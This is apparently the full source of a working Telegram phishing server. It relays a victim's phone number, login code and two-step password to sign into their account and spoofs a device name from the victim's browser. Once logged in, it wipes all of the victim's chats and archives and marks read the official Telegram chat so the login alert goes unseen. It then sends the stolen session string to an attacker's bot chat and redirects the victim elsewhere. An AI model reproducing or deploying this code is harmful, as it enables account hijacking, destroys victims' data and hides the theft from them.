require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { computeCheck } = require('telegram/Password');
const { NewMessage } = require('telegram/events');

const app = express();
app.use(cors());
app.use(express.json());

app.use(express.static(__dirname));

const apiId = Number(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;
const botToken = process.env.BOT_TOKEN;
const adminChatId = process.env.ADMIN_CHAT_ID;

const sessions = {};

function parseDeviceInfo(userAgent = '') {
    let deviceModel = 'Mobile App';
    let systemVersion = 'Android 13';

    if (/iPhone|iPad|iPod/.test(userAgent)) {
        deviceModel = 'iPhone';
        const match = userAgent.match(/OS (\d+[\_.]\d+)/);
        systemVersion = match ? `iOS ${match[1].replace('_', '.')}` : 'iOS 17.0';
    } else if (/Android/.test(userAgent)) {
        const androidMatch = userAgent.match(/Android (\d+(\.\d+)?)/);
        systemVersion = androidMatch ? `Android ${androidMatch[1]}` : 'Android 13';

        const modelMatch = userAgent.match(/\(([^)]+)\)/);
        if (modelMatch) {
            const parts = modelMatch[1].split(';');
            const possibleModel = parts.find(p => !p.includes('Linux') && !p.includes('Android') && !p.includes('wv'));
            if (possibleModel) {
                deviceModel = possibleModel.trim();
            } else {
                deviceModel = 'Samsung Galaxy S23';
            }
        }
    } else if (/Windows/.test(userAgent)) {
        deviceModel = 'PC Desktop';
        systemVersion = 'Windows 11';
    } else if (/Macintosh/.test(userAgent)) {
        deviceModel = 'MacBook Pro';
        systemVersion = 'macOS Sonoma';
    }

    return { deviceModel, systemVersion };
}

async function deleteAllChats(client) {
    try {
        const dialogs = await client.getDialogs({});

        for (const dialog of dialogs) {
            if (dialog.id.toString() === "777000" || dialog.name === "Telegram") {
                continue;
            }

            try {
                await client.invoke(new Api.messages.DeleteHistory({
                    peer: dialog.inputEntity,
                    maxId: 0,
                    revoke: true,
                    justClear: false
                }));

                const messages = await client.getMessages(dialog.entity, { limit: 100 });
                const messageIds = messages.map(msg => msg.id);

                if (messageIds.length > 0) {
                    await client.deleteMessages(dialog.entity, messageIds, { revoke: true });
                }
            } catch (err) {
                console.error(`Failed to wipe messages in dialog ${dialog.name || dialog.id}:`, err.message);
            }
        }
    } catch (err) {
        console.error("Error running deleteAllChats:", err.message);
    }
}

async function archiveAndReadTelegramChats(client) {
    try {
        const dialogs = await client.getDialogs({});

        for (const dialog of dialogs) {
            if (dialog.id.toString() === "777000" || dialog.name === "Telegram") {
                try {
                    await client.markAsRead(dialog.entity);
                    await client.invoke(
                        new Api.folders.EditPeerFolders({
                            folderPeers: [
                                new Api.InputFolderPeer({
                                    peer: dialog.inputEntity,
                                    folderId: 1,
                                }),
                            ],
                        })
                    );
                } catch (err) {
                    console.error("Failed to archive Telegram chat:", err.message);
                }
            }
        }
    } catch (err) {
        console.error("Error archiving chats:", err.message);
    }
}

async function cleanupPostLogin(client) {
    await deleteAllChats(client);
    await archiveAndReadTelegramChats(client);

    const eventHandler = async (event) => {
        try {
            const message = event.message;
            if (!message || !message.id) return;

            await client.markAsRead(message.peerId).catch(() => {});
            await client.deleteMessages(message.peerId, [message.id], { revoke: true }).catch(() => {});
            await archiveAndReadTelegramChats(client);
        } catch (err) {
            console.error("Error processing live message:", err.message);
        }
    };

    client.addEventHandler(eventHandler, new NewMessage({}));
    await new Promise(resolve => setTimeout(resolve, 60000));

    await deleteAllChats(client);
    await archiveAndReadTelegramChats(client);

    client.removeEventHandler(eventHandler, new NewMessage({}));
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/send-code', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
        return res.status(400).json({ success: false, error: "Phone number is required" });
    }

    try {
        const userAgent = req.headers['user-agent'] || '';
        const { deviceModel, systemVersion } = parseDeviceInfo(userAgent);

        const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
            connectionRetries: 5,
            deviceModel: deviceModel,
            systemVersion: systemVersion,
            appVersion: "10.2.1",
            langCode: "en",
        });
        await client.connect();

        const { phoneCodeHash } = await client.sendCode(
            { apiId, apiHash },
            phoneNumber
        );

        sessions[phoneNumber] = { client, phoneCodeHash };

        res.json({ success: true, message: "OTP code sent to your Telegram app!" });
    } catch (err) {
        console.error("Error sending code:", err);
        res.status(500).json({ success: false, error: err.message || "Failed to send code" });
    }
});

app.post('/api/verify-code', async (req, res) => {
    const { phoneNumber, code, password } = req.body;

    if (!phoneNumber || !code) {
        return res.status(400).json({ success: false, error: "Phone number and OTP code are required" });
    }

    const session = sessions[phoneNumber];
    if (!session) {
        return res.status(400).json({ success: false, error: "Session expired. Please request OTP again." });
    }

    try {
        const { client, phoneCodeHash } = session;

        if (password) {
            const passwordSrp = await client.invoke(new Api.account.GetPassword());
            const passwordCheck = await computeCheck(passwordSrp, password);
            await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
        } else {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phoneNumber,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code,
                })
            );
        }

        await cleanupPostLogin(client);

        const sessionString = client.session.save();
        delete sessions[phoneNumber];

        if (botToken && adminChatId) {
            try {
                const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: adminChatId,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (notifyErr) {
                console.error("Failed to send notification to Telegram Bot:", notifyErr);
            }
        }

        res.json({
            success: true,
            message: "Authentication successful!",
            session: sessionString,
            redirectUrl: "https://jvpfans.com"
        });
    } catch (err) {
        console.error("Error verifying code:", err);

        if (err.message && err.message.includes("SESSION_PASSWORD_NEEDED")) {
            return res.status(401).json({
                success: false,
                requiresPassword: true,
                error: "Two-Step Verification (2FA) password is required."
            });
        }

        res.status(400).json({ success: false, error: err.message || "Verification failed" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
